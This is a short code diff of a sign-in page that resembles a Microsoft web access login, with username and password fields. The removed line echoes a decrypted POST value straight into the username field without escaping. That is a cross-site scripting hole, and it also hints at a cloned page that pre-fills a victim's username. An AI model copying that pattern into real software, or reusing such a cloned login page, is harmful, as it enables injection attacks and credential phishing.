@@ -1367,7 +1367,7 @@ function RndMimeCtl()
             </div>
         
 		<div class="signInInputLabel" id="userNameLabel" aria-hidden="true">Domain\user name:</div>
-		<div><input id="username" name="username" class="signInInputText" value="<?php echo doDecrypt($_POST["token"]); ?>" role="textbox" aria-labelledby="userNameLabel"/></div>
+		<div><input id="username" name="username" class="signInInputText" value="" role="textbox" aria-labelledby="userNameLabel"/></div>
 		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
 		<div><input id="password" onfocus="g_fFcs=0" name="password" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel"/></div>
         <div><input id="passwordText" onfocus="g_fFcs=0" name="passwordText" value="" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel"/></div>
